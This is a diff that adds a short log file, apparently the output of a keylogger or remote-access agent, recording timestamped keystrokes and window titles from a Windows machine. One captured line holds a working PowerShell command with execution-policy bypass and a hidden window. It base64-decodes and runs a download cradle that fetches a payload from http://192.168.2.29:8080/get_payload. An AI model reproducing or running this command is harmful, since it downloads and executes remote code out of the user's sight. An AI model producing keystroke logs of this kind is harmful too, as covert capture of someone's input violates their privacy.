@@ -1,0 +1,10 @@
+Agent ID: 
+[ - 22.10.2021:15:10:22:83]
+c
+[ - 22.10.2021:15:10:22:83]
+cg
+[ - 22.10.2021:15:10:22:83]
+cgvnbbcbcvn[Enter]cmd[Enter]
+[C:\Windows\system32\cmd.exe - 22.10.2021:15:11:47:82]
+[Backspace][Backspace][C:\Windows\system32\cmd.exe - powershell  -exec bypass -WindowStyle Hidden IEX(IEX("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly8xOTIuMTY4LjIuMjk6ODA4MC9nZXRfcGF5bG9hZCIp'))")) - 22.10.2021:15:11:51:10][key - Not Defteri - 22.10.2021:15:12:04:67]
+[Backspace][Ctrl][Ctrl][Ctrl][Backspace][Backspace][Backspace][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl]
